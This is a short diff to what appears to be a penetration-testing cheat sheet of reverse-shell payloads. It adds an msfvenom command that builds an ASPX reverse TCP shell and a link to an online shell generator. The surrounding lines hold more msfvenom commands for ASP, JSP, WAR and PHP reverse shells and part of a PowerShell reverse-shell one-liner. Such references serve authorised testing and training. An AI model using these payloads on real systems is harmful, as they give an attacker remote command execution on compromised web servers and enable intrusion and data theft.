@@ -23,6 +23,10 @@ powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClie
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
 ```
+#### ASPX
+```
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f aspx > shell.aspx
+```
 #### JSP
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
@@ -35,6 +39,9 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.wa
 ```
 msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 ```
+
+#### Online Generator
+<https://www.revshells.com/>
 
 
 ## Single line Webshell
